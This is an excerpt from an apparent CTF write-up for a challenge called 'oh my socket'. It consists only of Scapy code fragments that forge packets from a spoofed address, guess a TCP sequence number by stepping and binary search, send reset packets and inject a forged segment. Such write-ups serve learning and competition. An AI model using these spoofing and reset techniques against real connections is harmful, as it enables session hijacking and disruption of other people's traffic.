# Source: https://github.com/ateamjkr/posts/blob/master/ctf/starctf-oh-my-socket-solution.md
...
def binary_search_recursive(start, end):
    ...
    mid = (start + end) // 2
    send(IP(src=server, dst=client)/TCP(sport=21587,dport=7775,flags='A',seq=mid)/'A',verbose=False)
...
for seq in range(int(2 ** 32 / 2 ** 24)):
    ...
    send(IP(src=server, dst=client)/TCP(sport=21587, dport=7775, flags='A', seq=seq*2**24)/'A',verbose=False)
...
for i in range(20):
    ...
    send(IP(src=server,dst=client)/TCP(sport=21587,dport=7775,flags='R',seq=seqno+i),verbose=False)
...
send(IP(src=client,dst=server)/TCP(sport=7775,dport=21587,flags='A',seq=31337)/'A',verbose=False)
